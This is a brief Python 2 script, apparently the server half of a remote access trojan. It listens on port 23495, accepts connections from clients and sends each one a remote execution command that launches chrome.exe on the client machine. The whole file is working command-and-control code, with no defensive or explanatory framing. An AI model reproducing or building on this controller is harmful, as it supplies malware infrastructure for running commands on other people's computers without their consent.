import socket

RAT_PORT = 23495
RAT_REMOTE_COMMAND_MAX = 5000

hosts = []
RAT_COMMAND_EXEC = "<!exec>@start;chrome.exe"

def MainLoop():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    connection.bind(('0.0.0.0', 23495))
    connection.listen(10)
    while True:
        current_connection, address = connection.accept()
            
        print address
        current_connection.send(RAT_COMMAND_EXEC)
        print "Sent"
            
MainLoop()
